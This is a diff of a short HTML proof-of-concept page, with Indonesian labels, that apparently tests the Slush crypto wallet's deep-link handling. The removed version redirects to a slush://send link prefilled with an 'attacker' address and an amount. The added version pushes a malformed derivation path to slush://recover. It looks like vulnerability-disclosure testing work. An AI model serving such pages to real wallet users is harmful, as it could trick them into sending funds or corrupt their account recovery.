@@ -3,43 +3,39 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>PoC Critical | Slush Wallet Hijack</title>
+    <title>PoC | Derivation Path Manipulation</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 50px; }
-        .box { border: 2px solid #ff0055; padding: 25px; border-radius: 12px; background: #111; display: inline-block; }
-        button { background: #ff0055; color: #fff; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .log { margin-top: 15px; font-size: 12px; color: #00ff00; font-family: monospace; }
+        body { background: #000; color: #ffaa00; font-family: monospace; text-align: center; padding: 50px; }
+        .box { border: 2px solid #ffaa00; padding: 25px; border-radius: 12px; background: #111; display: inline-block; }
+        button { background: #ffaa00; color: #000; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .log { margin-top: 15px; font-size: 12px; color: #888; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>CRITICAL PoC</h2>
-    <p>Uji coba pengisian otomatis transaksi (Auto-fill).</p>
+    <h2>RECOVERY PATH TEST</h2>
+    <p>Menguji validasi Derivation Path (BIP44) pada Wallet.</p>
     
-    <button onclick="runExploit()">JALANKAN EKSPLOITASI</button>
+    <button onclick="testPathInjection()">INJECT CORRUPT PATH</button>
     
-    <div id="status" class="log">> Menunggu interaksi...</div>
+    <div id="status" class="log">> Menunggu perintah...</div>
 </div>
 
 <script>
-    function runExploit() {
+    function testPathInjection() {
         const out = document.getElementById('status');
         
-       
-        const attackerAddress = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"; //
-        const amount = "1.5"; //
+     
+        const badPath = "m/44'/60'/0'/0/invalid_index"; 
         
-      
-        const maliciousUri = `slush://send?to=${attackerAddress}&amount=${amount}`; //
+        out.innerText = "Attempting to inject: " + badPath; 
 
-        out.innerText = "Triggering: " + maliciousUri; //
         
-    
-        window.location.href = maliciousUri; //
+        window.location.href = `slush://recover?path=${badPath}`;
 
         setTimeout(() => {
-            alert("PERIKSA DOMPET:\nJika layar kirim terbuka dengan alamat 0x742... dan jumlah 1.5 terisi otomatis, temuan ini adalah CRITICAL."); //
+            alert("AUDIT SELESAI:\nPeriksa dompet Anda. Jika aplikasi mencoba memulihkan akun menggunakan jalur '" + badPath + "' tanpa pesan error, ini adalah kerentanan integritas.");
         }, 1000);
     }
 </script>
